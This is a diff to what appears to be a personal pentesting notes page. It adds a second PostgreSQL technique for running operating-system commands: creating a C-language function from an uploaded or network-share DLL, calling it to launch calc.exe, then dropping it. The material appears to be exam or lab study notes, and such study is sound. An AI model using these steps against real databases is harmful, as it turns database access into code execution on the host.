@@ -353,6 +353,26 @@ SELECT sys_exec('touch /tmp/test_postgresql');
 {% endhighlight %}
 
 
+In postgres (2nd way): 
+
+{% highlight sql %}
+--compile example DLL (see script/web/postgresmodule.c) and upload it to the machine or accessable network share
+
+--check for function first
+\df test
+
+--Create function from compiled DLL (see script/web/postgresmodule.c)
+create or replace function test(text, integer) returns void as $$c:\compiled.dll$$, $$awae$$ LANGUAGE C STRICT;
+create or replace function test(text, integer) returns void as $$//192.168.1.29/impk_share/compiled.dll$$, $$awae$$ LANGUAGE C STRICT;
+
+--execute
+select test($$calc.exe$$, 3);
+
+--remove function
+drop function test(text, integer);
+{% endhighlight %}
+
+
 > **SQL Injection Cheat Sheets**
 
 * [websec](https://websec.ca/kb/sql_injection)
